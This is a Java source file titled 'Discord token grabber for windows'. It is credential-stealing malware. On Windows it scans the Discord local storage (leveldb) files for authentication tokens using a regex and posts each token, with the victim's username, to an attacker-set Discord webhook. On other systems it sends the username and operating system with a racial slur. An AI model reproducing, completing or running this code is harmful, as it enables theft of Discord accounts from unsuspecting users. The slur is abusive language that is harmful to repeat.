/*
Created by XEFER on 14/03/2020
Discord token grabber for windows
*/

import java.io.BufferedReader; 
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
public class DiscordGrabber {
	
	private static String username = System.getProperty("user.name");
    private static String DiscordWebhookLink = "";
    private static String BOTName = "";
    private static String BOTImageURL = "";
	
	public static void main(String[] args) throws IOException {

        String os = System.getProperty("os.name");
        
        
        

        if(os.contains("Windows")) {
            String path = System.getProperty("user.home") +"/AppData/Roaming/Discord/Local Storage/leveldb/";;
            String username = System.getProperty("user.name");

            String[] pathnames;

            File f = new File(path);

            pathnames = f.list();
        	
        	
        	for (String pathname : pathnames) {
                try {
                    FileInputStream fstream = new FileInputStream(path + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {

                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                        Matcher m = p.matcher(strLine);

                        while (m.find()) {
                    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
                            webhook.setContent(username + "  -  " + m.group());
                            webhook.setAvatarUrl(BOTImageURL);
                            webhook.setUsername(BOTName);
                            webhook.setTts(false);
                            webhook.execute();
                        }
                    }

                } catch (Exception e) {}
            }
        }else {
    		DiscordSender webhook = new DiscordSender(DiscordWebhookLink);
            webhook.setContent(username + "  -  " + " this nigga uses " + os);
            webhook.setAvatarUrl(BOTImageURL);
            webhook.setUsername(BOTName);
            webhook.setTts(false);
            webhook.execute();
        }
        	
        }      
}
